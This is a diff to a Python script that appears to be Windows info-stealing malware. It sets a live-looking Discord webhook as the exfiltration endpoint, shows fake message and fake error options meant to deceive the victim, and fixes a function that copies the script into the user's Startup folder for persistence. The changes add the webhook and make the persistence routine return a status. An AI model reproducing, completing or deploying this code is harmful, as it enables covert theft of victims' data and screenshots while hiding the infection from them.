@@ -22,7 +22,7 @@ from PIL import ImageGrab
 ### CONFIG ### 
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 fakeerror = True # If True it will make an fake error message at the end
-webhook = '' #Put ur webhook
+webhook = 'https://discord.com/api/webhooks/1101568518459228170/HMiQhuwnhaZmmVlUrQzXu-_sKlfDBQZQfRdGTPWfpCzFcKtLqlPHIixt3iqVsMGe-b9b' #Put ur webhook
 Startup = 'Unsuccessfully added to startup !'
 
 if shitty_message == True:
@@ -33,6 +33,7 @@ file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
 
 def add_to_startup(py_file_path=file_path, bat_file_path=None):
+    global Startup
     if not bat_file_path:
         bat_file_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
     Startup = 'Successfully added to startup !'
@@ -62,12 +63,10 @@ def add_to_startup(py_file_path=file_path, bat_file_path=None):
     # Write the updated contents back to the file
     with open(bat_file_path, "w", encoding="utf-8") as f:
         f.write(contents)
-
+    return Startup
 
 
 add_to_startup()
-
-
 
 def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
